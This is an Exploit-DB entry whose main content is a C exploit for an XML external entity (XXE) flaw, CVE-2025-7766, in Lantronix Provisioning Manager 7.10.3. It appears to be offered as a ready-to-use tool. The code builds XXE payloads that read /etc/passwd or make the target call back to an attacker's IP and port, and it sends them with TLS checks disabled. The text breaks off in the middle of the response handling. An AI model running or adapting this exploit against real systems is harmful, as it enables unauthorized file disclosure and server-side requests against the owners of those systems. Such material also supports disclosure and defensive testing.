---
title: [webapps] Lantronix Provisioning Manager 7.10.3 - XML External Entity Injection (XXE)
url: https://www.exploit-db.com/exploits/52417
source: Exploit-DB.com RSS Feed
date: 2025-08-19
fetch_date: 2025-10-07T00:16:09.524715
---

# [webapps] Lantronix Provisioning Manager 7.10.3 - XML External Entity Injection (XXE)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Lantronix Provisioning Manager 7.10.3 - XML External Entity Injection (XXE)

#### EDB-ID:

###### 52417

#### CVE:

###### [2025-7766](https://nvd.nist.gov/vuln/detail/CVE-2025-7766)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-18

---

**Vulnerable App:**

```
/*
 * Exploit Title: Lantronix Provisioning Manager 7.10.3 - XML External Entity Injection (XXE)
 * Google Dork: N/A
 * Date: 2025-08-17
 * Exploit Author: Byte Reaper
 * Vendor Homepage: https://www.lantronix.com/
 * Software Link: https://www.lantronix.com/products/lantronix-provisioning-manager/
 * Version: Provisioning Manager ≤ 7.10.3
 * Tested on: Kali Linux
 * CVE: CVE-2025-7766
 */

#include<stdio.h>
#include<string.h>
#include"argparse.h"
#include<curl/curl.h>
#include<stdlib.h>
#include<unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#define FULL_URL 3000
#define SIZE_PAYLOAD 4000
const char *yourIp = NULL;
const char *url = NULL ;
int yourPort = 0;
int selecetCookie = 0;
int verbose = 0;
int loop = 0;
int selectPayload = 0;
const char *yourPayload = NULL;
char full[FULL_URL];
int requestPayload = 0;
const char *cookies = NULL;

void exitSyscall()
{
    __asm__ volatile
    (
        "xor %%rdi, %%rdi\n\t"
        "mov $0x3C, %%rax\n\t"
        "syscall\n\t"
        :
        :
        :"rax", "rdi"
    );
}
struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        printf("\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitSyscall();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}

void xmlPost(const char *fullUrl, const char *yourIp, int yourPort)
{
    char payload[SIZE_PAYLOAD];
    struct Mem response =
    {
        NULL,
        0
    };
    if (selectPayload)
    {
        int s = snprintf(payload,sizeof(payload),yourPayload);
        if (s < 0 || s >= sizeof(payload))
        {
            printf("\e[1;31m[-] Check len payload (yourPayload >= Size Payload) !\e[0m\n");
            exitSyscall();
        }
    }
    if (requestPayload)
    {
        printf("\e[1;37m[+] Payload Select : Send Request Payload\e[0m\n");
        printf("\e[1;34m[+] Please Check Server (python server, apache...)\e[0m\n");

        const char *payloadR =
            "<?xml version=\"1.0\"?>\n"
            "<!DOCTYPE doc [\n"
            "  <!ENTITY xxe SYSTEM \"http://%s:%d/xxe.test\">\n"
            "]>\n"
            "<config>\n"
            "  <doc>&xxe;</doc>\n"
            "</config>\n"
        ;
        int r = snprintf(payload, sizeof(payload), payloadR, yourIp, yourPort);
        if (r < 0 || r >= sizeof(payload))
        {
            printf("\e[1;31m[-] Error building payloadR\n");
            exitSyscall();
        }
    }
    else
    {
        printf("\e[1;37m[+] Payload Select : Read File : /etc/passwd !\e[0m\n");
        const char *autoPayload =
            "<?xml version=\"1.0\"?>\n"
            "<!DOCTYPE doc [\n"
            "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
            "]>\n"
            "<config>\n"
            "  <doc>&xxe;</doc>\n"
            "</config>\n"
        ;
        snprintf(payload,
                 sizeof(payload),
                 autoPayload);
    }

    CURL *curl = curl_easy_init();
    if (curl == NULL)
    {
        printf("\e[1;31m[-] Error Create Object Curl !\e[0m\n");
        exitSyscall();
    }
    response.buffer  = NULL;
    response.len = 0;

    if (verbose)
    {
        printf("\e[1;35m==========================================\e[0m\n");
        printf("[+] Cleaning Response...\n");
        printf("[+] Response Buffer : %s\n", response.buffer);
        printf("[+] Response Len : %zu\n", response.len);
        printf("\e[1;35m==========================================\e[0m\n");
    }
    CURLcode res;
    if (curl)
    {
        curl_easy_setopt(curl,
                         CURLOPT_URL,
                         fullUrl);
        curl_easy_setopt(curl,
                         CURLOPT_POSTFIELDS,
                         payload);
        curl_easy_setopt(curl,
                         CURLOPT_POSTFIELDSIZE,
                         strlen(payload));

        if (selecetCookie)
        {
            curl_easy_setopt(curl,
                             CURLOPT_COOKIEFILE,
                             cookies);
            curl_easy_setopt(curl,
                             CURLOPT_COOKIEJAR,
                             cookies);

        }
        curl_easy_setopt(curl,
                         CURLOPT_FOLLOWLOCATION,
                         1L);
        sleep(1);
        curl_easy_setopt(curl,
                         CURLOPT_WRITEFUNCTION,
                         write_cb);
        if (verbose)
        {
            printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
            curl_easy_setopt(curl,
                             CURLOPT_VERBOSE,
                             1L);
        }
        curl_easy_setopt(curl,
                         CURLOPT_WRITEDATA,
                         &response);
        curl_easy_setopt(curl,
                         CURLOPT_CONNECTTIMEOUT,
                         5L);
        curl_easy_setopt(curl,
                         CURLOPT_TIMEOUT,
                         10L);
        curl_easy_setopt(curl,
                         CURLOPT_SSL_VERIFYPEER,
                         0L);
        curl_easy_setopt(curl,
                         CURLOPT_SSL_VERIFYHOST,
                         0L);
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers,
                                    "Accept-Language: en-US,en");
        headers = curl_slist_append(headers,
                              "Connection: keep-alive");
        headers = curl_slist_append(headers,
                                    "Referer: http://example.com");
        headers =curl_slist_append(headers,
                                   "Content-Type: application/xml");
         double totalTime;
        res = curl_easy_perform(curl);
        if (res == CURLE_OK)
        {
             curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &totalTime);
             printf("\e[1;32m[+] Delayed response : %f\n",  totalTime );
             printf("\e[1;36m[+] Request sent successfully\e[0m\n");
             printf("\e[1;34m[+] Full URl : %s\e[0m\n", full);
             if (verbose)
             {
                 printf("\e[1;35m---------------------------[Payload Data]---------------------------\e[0m\n");
                 printf("[+] Post data : %s\n", payload);
                 printf("\e[1;35m-----------------------------------------------------------------\e[0m\n");
             }
             long httpCode= 0 ;
             curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpCode);
             if (httpCode >= 200 && httpCode < 300)
             {
                 printf("\e[1;34m[+] Possible server vulnerability (CVE-2025-7766)!\e[0m\n");                     printf("\e[1;34m...